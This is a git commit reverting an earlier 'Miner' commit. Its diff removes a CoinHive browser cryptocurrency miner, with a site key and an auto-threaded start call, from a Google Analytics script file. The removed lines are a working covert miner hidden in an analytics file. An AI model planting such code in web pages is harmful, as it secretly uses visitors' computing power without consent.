543adbd5991eb8f9b0c3c8faa0acded91af3ee0d
HaoZeke <driger633@gmail.com>
2017-11-16 11:46:07 +0530

    Revert "[SQUASHED] Miner"
    This reverts commit 22b01cc9d901c6741d7c281d3389ca136ad89567.

--- src/js/gAnalytics.js
+++ src/js/gAnalytics.js
@@ -1,10 +1,5 @@
-// Analytics
 window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 
 gtag('config', 'UA-109503488-1');
-
-// CoinHive
-var miner = new CoinHive.Anonymous('cscbhkLGY5afkBmv2Z8J0cpzAMmulLFn', {autoThreads: true});
-miner.start();
